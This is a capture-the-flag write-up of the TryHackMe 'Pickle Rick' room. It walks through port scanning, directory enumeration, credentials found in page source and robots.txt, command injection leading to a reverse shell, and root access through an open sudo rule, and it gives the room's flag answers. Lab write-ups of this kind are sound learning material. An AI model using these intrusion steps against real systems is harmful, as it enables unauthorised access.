
# Pickle Rick - TryHackMe 

```bash
❯ victim -i '10.10.84.218'
Saved! 
``` 

## Nmap Scans

```
Starting Nmap 7.80 ( https://nmap.org ) at 2023-10-05 15:35 +0530
Initiating Parallel DNS resolution of 1 host. at 15:35
Completed Parallel DNS resolution of 1 host. at 15:35, 0.00s elapsed
Initiating SYN Stealth Scan at 15:35
Scanning 10.10.84.218 (10.10.84.218) [65535 ports]
Discovered open port 80/tcp on 10.10.84.218
Discovered open port 22/tcp on 10.10.84.218
Completed SYN Stealth Scan at 15:35, 8.97s elapsed (65535 total ports)
Nmap scan report for 10.10.84.218 (10.10.84.218)

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63 
80/tcp open  http    syn-ack ttl 63 
``` 

* Open ports: 22 ssh , 80 http 

## Web Enumeration

![webpage](https://i.postimg.cc/nLGcQFR1/webpage.png)

* Dirsearch results

```bash
❯ dirsearch -u http://$VMIP/ -w /opt/wordlists/big.txt -e .php 200
  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php | HTTP method: GET | Threads: 30 | Wordlist size: 20477

Output File: /home/trevohack/.dirsearch/reports/10.10.84.218/-_23-10-05_16-01-07.txt

Error Log: /home/trevohack/.dirsearch/logs/errors-23-10-05_16-01-07.log

Target: http://10.10.84.218/

[16:01:08] Starting: 
[16:01:13] 200 -  882B  - /login.php
[16:01:30] 301 -  313B  - /assets  ->  http://10.10.84.218/assets/
[16:03:33] 200 -   17B  - /robots.txt
[16:03:41] 403 -  300B  - /server-status
``` 

* Found a login panel `/login.php` 

* `robots.txt` reveals some text `Wubbalubbadubdub` 

* The `html` source of the main page reveals a username 

```html
<!--

    Note to self, remember username!

    Username: R1ckRul3s

-->
``` 

* Login to the site using the creds `R1ckRul3s:Wubbalubbadubdub`

![logon](https://i.postimg.cc/g08LtbMw/login.png)

* You will be presented a command panel where you could inject commands to the server. 

![command](https://i.postimg.cc/mhf0wMh1/command-panel.png)

## Getting a shell 


* Run a bash rev shell on the server to obtain a shell as `www-data`

![shell-got](https://i.postimg.cc/26BY7CTJ/shell.png)

### First Ingredient

```bash
$ cat /var/www/html/Sup3rS3cretPickl3Ingred.txt
mr. meeseek hair 
``` 

* Exploring the files you may find the second ingredient easily

```bash
cat '/home/rick/second ingredients'
1 jerry tear
``` 

## Privilege Escalation

* Running `sudo -l -l` shows that `www-data` can run anything without password 

```bash
www-data@ip-10-10-84-218:/home/rick$ sudo -l -l 
sudo -l -l 
Matching Defaults entries for www-data on
    ip-10-10-84-218.eu-west-1.compute.internal:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on
        ip-10-10-84-218.eu-west-1.compute.internal:

Sudoers entry:
    RunAsUsers: ALL
    Options: !authenticate
    Commands:
	ALL
``` 

```bash
www-data@ip-10-10-84-218:/home/rick$ sudo su - root
sudo su - root
mesg: ttyname failed: Inappropriate ioctl for device
id 
uid=0(root) gid=0(root) groups=0(root)
cd /root
ls
3rd.txt
snap
cat 3rd.txt
3rd ingredients: fleeb juice 
``` 

## CTF Done 
